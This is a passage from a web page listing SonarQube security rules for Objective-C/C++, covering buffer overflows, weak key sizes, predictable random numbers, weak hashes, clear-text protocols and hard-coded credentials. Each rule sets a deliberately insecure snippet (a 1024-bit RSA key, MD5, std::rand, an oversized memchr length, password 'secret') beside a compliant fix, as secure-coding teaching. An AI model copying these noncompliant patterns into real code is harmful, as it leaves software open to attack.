<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5782">
              objc:S5782
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Array overruns and buffer overflows happen when memory access accidentally goes beyond the boundary of the allocated array or buffer. These
overreaching accesses cause some of the most damaging, and hard to track defects.</p>
<p>When the buffer overflow happens while reading a buffer, it can expose sensitive data that happens to be located next to the buffer in memory. When
it happens while writing a buffer, it can be used to inject code or to wipe out sensitive memory.</p>
<p>This rule detects when a POSIX function takes one argument that is a buffer and another one that represents the size of the buffer, but the two
arguments do not match.</p>
<h3>Noncompliant code example</h3>
<pre>
char array[10];
initialize(array);
void *pos &#61; memchr(array, &#39;&#64;&#39;, 42); // Noncompliant, buffer overflow that could expose sensitive data
</pre>
<h3>Compliant solution</h3>
<pre>
char array[10];
initialize(array);
void *pos &#61; memchr(array, &#39;&#64;&#39;, 10);
</pre>
<h3>Exceptions</h3>
<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic
pattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP Top 10 2017 Category A9</a> -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/119" rel="nofollow">MITRE, CWE-119</a> - Improper Restriction of Operations within the Bounds of a Memory
  Buffer </li><li> <a href="https://cwe.mitre.org/data/definitions/131" rel="nofollow">MITRE, CWE-131</a> - Incorrect Calculation of Buffer Size </li><li> <a href="https://cwe.mitre.org/data/definitions/788" rel="nofollow">MITRE, CWE-788</a> - Access of Memory Location After End of Buffer </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/wtYxBQ" rel="nofollow">CERT, ARR30-C.</a> - Do not form or use out-of-bounds pointers or array subscripts </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/i3w-BQ" rel="nofollow">CERT, STR50-CPP.</a> - Guarantee that storage for strings has sufficient space for
  character data and the null terminator </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S4426">
              objc:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br /> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant
}
</pre>
<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group(&#34;dsa/botan/1024&#34;); // Noncompliant
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the algorithm
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group(&#34;secp160k1&#34;); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group(&#34;dsa/botan/2048&#34;);
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group(&#34;secp224k1&#34;);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S2245">
              objc:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive
data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from
  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;random&gt;
// ...

void f() {
  int random_int &#61; std::rand(); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;sodium.h&gt;
#include &lt;botan/system_rng.h&gt;
// ...

void f() {
  char random_chars[10];
  randombytes_buf(random_chars, 10); // Compliant
  uint32_t random_int &#61; randombytes_uniform(10); // Compliant

  uint8_t random_chars[10];
  Botan::System_RNG system;
  system.randomize(random_chars, 10); // Compliant
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/oTdGBQ" rel="nofollow">CERT, MSC02-J.</a> - Generate strong random numbers </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ" rel="nofollow">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ" rel="nofollow">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S4790">
              objc:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(&#34;MD5&#34;)); // Sensitive
    return hash-&gt;process(input);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(&#34;SHA-512&#34;)); // Compliant
    return hash-&gt;process(input);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5332">
              objc:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
char* http_url &#61; &#34;http://example.com&#34;; // Sensitive
char* ftp_url &#61; &#34;ftp://anonymous&#64;example.com&#34;; // Sensitive
char* telnet_url &#61; &#34;telnet://anonymous&#64;example.com&#34;; // Sensitive
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftp &#61; curl_easy_init();
curl_easy_setopt(curl_ftp, CURLOPT_URL, &#34;ftp://example.com/&#34;); // Sensitive

CURL *curl_smtp &#61; curl_easy_init();
curl_easy_setopt(curl_smtp, CURLOPT_URL, &#34;smtp://example.com:587&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
char* https_url &#61; &#34;https://example.com&#34;;
char* sftp_url &#61; &#34;sftp://anonymous&#64;example.com&#34;;
char* ssh_url &#61; &#34;ssh://anonymous&#64;example.com&#34;;
</pre>
<pre>
#include &lt;curl/curl.h&gt;

CURL *curl_ftps &#61; curl_easy_init();
curl_easy_setopt(curl_ftps, CURLOPT_URL, &#34;ftp://example.com/&#34;);
curl_easy_setopt(curl_ftps, CURLOPT_USE_SSL, CURLUSESSL_ALL); // FTP transport is done over TLS

CURL *curl_smtp_tls &#61; curl_easy_init();
curl_easy_setopt(curl_smtp_tls, CURLOPT_URL, &#34;smtp://example.com:587&#34;);
curl_easy_setopt(curl_smtp_tls, CURLOPT_USE_SSL, CURLUSESSL_ALL); // SMTP with STARTTLS
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S2068">
              objc:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule looks for hard-coded credentials in variable names that match any of the patterns from the provided list.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string password &#61; &#34;secret&#34;; // Sensitive
dbi_conn_set_option(conn, &#34;password&#34;, password.c_str());
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn &#61; dbi_conn_new(&#34;mysql&#34;);
string password &#61; getDatabasePassword(); // Compliant
dbi_conn_set_option(conn, &#34;password&#34;, password.c_str()); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5798">
              objc:S5798
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The compiler is generally allowed to remove code that does not have any effect, according to the abstract machine of the C language. This means
that if you have a buffer that contains sensitive data (for instance passwords), calling <code>memset</code> on the buffer before releasing the memory
will probably be optimized away.</p>
